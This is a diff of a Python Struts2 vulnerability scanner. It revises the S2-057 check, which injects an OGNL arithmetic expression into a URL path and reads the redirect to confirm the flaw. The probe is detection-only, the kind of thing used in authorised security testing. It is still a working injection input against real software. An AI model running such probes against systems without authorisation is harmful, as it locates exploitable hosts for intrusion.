@@ -227,14 +227,15 @@ class struts_baseverify:
             print "超时原因: ", e
 
         try:
-            self.url = self.url.replace("/actionChain1.action", "/${12345%2a54321}/actionChain1.action")
-            req = requests.get(self.url, timeout=6, verify=False, allow_redirects=True)
+            surl = self.url[self.url.rfind('/')::]
+            rurl = self.url.replace(surl, "") + "/$%7B12345*54321%7D" + surl
+            req = requests.get(rurl, timeout=6, verify=False, allow_redirects=True)
             if r"670592745" in req.url:
                 cprint("目标存在struts2-057漏洞..(只提供检测)", "red")
                 filecontent.writelines("struts2-057 success!!!\n")
             else:
                 cprint("目标不存在struts2-057漏洞..(只提供检测)", "green")
-        except:
+        except Exception as e:
             cprint("检测struts2-057超时..", "cyan")
             print "超时原因: ", e
 
